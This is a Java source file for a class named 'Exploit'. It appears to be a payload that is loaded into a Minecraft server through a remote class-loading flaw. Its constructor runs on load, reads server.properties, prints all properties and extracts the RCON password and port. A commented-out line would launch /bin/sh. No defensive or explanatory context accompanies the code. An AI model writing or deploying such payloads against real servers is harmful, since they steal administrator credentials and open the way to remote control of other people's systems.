import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.Properties;

public class Exploit {

    public Exploit() throws Exception {
        new Thread(() -> {
            try {
                // java.lang.Process p = new java.lang.ProcessBuilder("/bin/sh").start();
                loadProperties();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    public static RconCredential loadProperties() throws Exception {
        // Load server.properties
        Properties props = new Properties();
        RconCredential cred = new RconCredential();

        try (FileInputStream fis = new FileInputStream("server.properties")) {
            props.load(fis);
        }
        System.out.println(props);

        String host = "127.0.0.1";
        int port = Integer.parseInt(props.getProperty("rcon.port", "25575"));
        String password = props.getProperty("rcon.password");
        if (password == null || password.isEmpty()) {
            System.err.println("Missing rcon.password in server.properties");
            return null;
        }

        cred.host = host;
        cred.port = port;
        cred.password = password;
        return cred;
    }


    static class RconCredential {
        String host = "localhost";
        int port;
        String password;

        @Override
        public String toString() {
            return "RconCredential{" +
                    "host='" + host + '\'' +
                    ", port=" + port +
                    ", password='" + password + '\'' +
                    '}';
        }
    }
}
